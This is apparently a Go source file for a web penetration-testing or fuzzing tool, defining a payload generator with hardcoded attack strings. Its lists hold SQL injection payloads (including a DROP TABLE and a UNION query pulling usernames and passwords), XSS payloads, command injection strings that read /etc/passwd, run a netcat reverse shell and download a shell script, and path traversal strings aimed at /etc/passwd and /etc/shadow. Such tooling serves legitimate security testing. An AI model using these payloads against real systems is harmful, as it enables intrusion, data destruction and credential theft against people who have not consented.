package main

import (
	"fmt"
	"math/rand"
	"strings"
)

type PayloadType string

const (
	SQL             PayloadType = "sql"
	XSS             PayloadType = "xss"
	CommandInj      PayloadType = "command"
	PathTraversal   PayloadType = "path_traversal"
	FUZZ            PayloadType = "fuzz"
)

type PayloadGenerator struct {
	sqlPayloads         []string
	xssPayloads         []string
	commandPayloads     []string
	pathTraversalPayloads []string
}

func NewPayloadGenerator() *PayloadGenerator {
	pg := &PayloadGenerator{}
	pg.initPayloads()
	return pg
}

func (pg *PayloadGenerator) initPayloads() {
	// SQL Injection payloads
	pg.sqlPayloads = []string{
		"' OR '1'='1",
		"' OR '1'='1' --",
		"' UNION SELECT NULL, NULL --",
		"1' ORDER BY 1--",
		"1' UNION SELECT database(), version()--",
		"' OR EXISTS(SELECT * FROM users)--",
		"admin'--",
		"' OR 'a'='a",
		"1; DROP TABLE users--",
		"' UNION SELECT username, password FROM users--",
		"' OR 1=1--",
		"' OR '1'='1' /*",
		"' AND 1=0 UNION SELECT 1,2,3--",
		"' AND SLEEP(5)--",
		"' OR IF(1=1,SLEEP(5),0)--",
	}

	// XSS payloads
	pg.xssPayloads = []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert('XSS')>",
		"javascript:alert('XSS')",
		"<body onload=alert('XSS')>",
		"<iframe src=javascript:alert('XSS')>",
		"<input onfocus=alert('XSS') autofocus>",
		"<video><source onerror=alert('XSS')>",
		"<marquee onscroll=alert('XSS')>",
		"\" onmouseover=\"alert('XSS')\"",
		"' onfocus='alert(\"XSS\")'",
		" onload=alert('XSS')",
		"';alert('XSS');//",
		"\";alert('XSS');//",
		"');alert('XSS');//",
		"`);alert('XSS');//",
	}

	// Command Injection payloads
	pg.commandPayloads = []string{
		"; ls -la",
		"| cat /etc/passwd",
		"& whoami",
		"&& id",
		"|| ping -c 1 127.0.0.1",
		"`whoami`",
		"$(cat /etc/passwd)",
		"; nc -e /bin/sh 127.0.0.1 4444",
		"| wget http://127.0.0.1/shell.sh -O /tmp/shell.sh",
		"&& python -c 'import socket,subprocess,os;s=socket.socket()'",
		"& dir C:\\",
		"| type C:\\Windows\\system.ini",
		"&& net users",
		"|| ipconfig /all",
		"%26%26%20whoami",
	}

	// Path Traversal payloads
	pg.pathTraversalPayloads = []string{
		"../../../etc/passwd",
		"....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"../../../../etc/shadow",
		".../.../.../etc/passwd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"../../etc/passwd%00.jpg",
		"/etc/passwd",
		"C:\\Windows\\System32\\drivers\\etc\\hosts",
	}
}

func (pg *PayloadGenerator) GenerateSQLPayloads(basePayload ...string) []string {
	if len(basePayload) > 0 && basePayload[0] != "" {
		variations := []string{}
		payload := basePayload[0]
		
		variations = append(variations, payload)
		variations = append(variations, strings.ReplaceAll(payload, "'", "%27"))
		variations = append(variations, strings.ReplaceAll(payload, "'", "%2527"))
		variations = append(variations, strings.ReplaceAll(payload, " ", "%20"))
		variations = append(variations, strings.ReplaceAll(payload, " ", "/**/"))
		
		return variations
	}
	return pg.sqlPayloads
}

func (pg *PayloadGenerator) GenerateXSSPayloads(context ...string) []string {
	payloads := make([]string, len(pg.xssPayloads))
	copy(payloads, pg.xssPayloads)
	
	if len(context) > 0 {
		ctx := context[0]
		switch ctx {
		case "attribute":
			payloads = append(payloads,
				"\" onmouseover=\"alert('XSS')\"",
				"' onfocus='alert(\"XSS\")'",
				" onload=alert('XSS')",
				" autofocus onfocus=alert('XSS')",
			)
		case "javascript":
			payloads = append(payloads,
				"';alert('XSS');//",
				"\";alert('XSS');//",
				"');alert('XSS');//",
				"`);alert('XSS');//",
			)
		}
	}
	
	return payloads
}

func (pg *PayloadGenerator) GenerateCommandPayloads(osType ...string) []string {
	payloads := make([]string, len(pg.commandPayloads))
	copy(payloads, pg.commandPayloads)
	
	if len(osType) > 0 && osType[0] == "windows" {
		payloads = append(payloads,
			"& dir C:\\",
			"| type C:\\Windows\\system.ini",
			"&& net users",
			"|| ipconfig /all",
			"%26%26%20whoami",
		)
	}
	
	return payloads
}

func (pg *PayloadGenerator) GeneratePathTraversalPayloads(depth ...int) []string {
	d := 3
	if len(depth) > 0 {
		d = depth[0]
	}
	
	payloads := make([]string, len(pg.pathTraversalPayloads))
	copy(payloads, pg.pathTraversalPayloads)
	
	// Generate payloads with varying depth
	for i := 1; i <= d+2; i++ {
		traversal := strings.Repeat("../", i)
		payloads = append(payloads, 
			traversal+"etc/passwd",
			traversal+"etc/shadow",
			traversal+"windows/win.ini",
			traversal+"..\\windows\\system32\\drivers\\etc\\hosts",
		)
	}
	
	// Remove duplicates
	return removeDuplicates(payloads)
}

func (pg *PayloadGenerator) GenerateFuzzPayloads(length ...int) []string {
	l := 100
	if len(length) > 0 {
		l = length[0]
	}
	
	payloads := []string{}
	
	// Buffer overflow payloads
	payloads = append(payloads, strings.Repeat("A", l))
	payloads = append(payloads, strings.Repeat("\x00", l))
	payloads = append(payloads, strings.Repeat("%n", l/2))
	
	// Special characters
	specialChars := "!@#$%^&*()_+-=[]{}|;':\",./<>?`~"
	payloads = append(payloads, strings.Repeat(specialChars, 3))
	
	return payloads
}

func (pg *PayloadGenerator) GenerateCustomPayloads(pattern string, count int) []string {
	payloads := []string{}
	
	for i := 0; i < count; i++ {
		if strings.Contains(pattern, "{num}") {
			payloads = append(payloads, strings.Replace(pattern, "{num}", fmt.Sprintf("%d", i), -1))
		} else if strings.Contains(pattern, "{str}") {
			randomStr := randomString(5)
			payloads = append(payloads, strings.Replace(pattern, "{str}", randomStr, -1))
		} else {
			payloads = append(payloads, fmt.Sprintf("%s_%d", pattern, i))
		}
	}
	
	return payloads
}

func removeDuplicates(slice []string) []string {
	keys := make(map[string]bool)
	list := []string{}
	for _, entry := range slice {
		if _, value := keys[entry]; !value {
			keys[entry] = true
			list = append(list, entry)
		}
	}
	return list
}

func randomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func (pg *PayloadGenerator) GetPayloadsByType(payloadType PayloadType) []string {
	switch payloadType {
	case SQL:
		return pg.GenerateSQLPayloads()
	case XSS:
		return pg.GenerateXSSPayloads()
	case CommandInj:
		return pg.GenerateCommandPayloads()
	case PathTraversal:
		return pg.GeneratePathTraversalPayloads()
	case FUZZ:
		return pg.GenerateFuzzPayloads(50)
	default:
		return pg.GenerateFuzzPayloads(50)
	}
}
